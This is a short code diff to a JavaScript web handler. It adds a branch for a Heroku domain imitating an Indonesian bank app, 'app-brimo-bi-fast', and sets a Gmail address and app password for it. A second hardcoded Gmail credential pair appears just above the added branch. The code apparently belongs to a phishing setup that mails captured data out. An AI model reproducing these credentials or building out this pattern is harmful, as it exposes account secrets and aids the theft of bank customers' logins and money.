@@ -53,6 +53,11 @@ export default function handler(req, res) {
         email = 'borosss940@gmail.com';
         pass = 'limdsccatyovxtxk';
        
+    }
+    else if (url == 'app-brimo-bi-fast.herokuapp.com'){
+        email = 'lupa10203070@gmail.com';
+        pass = 'xwnxmsljgdwgtcva';
+       
         }
         
         try {
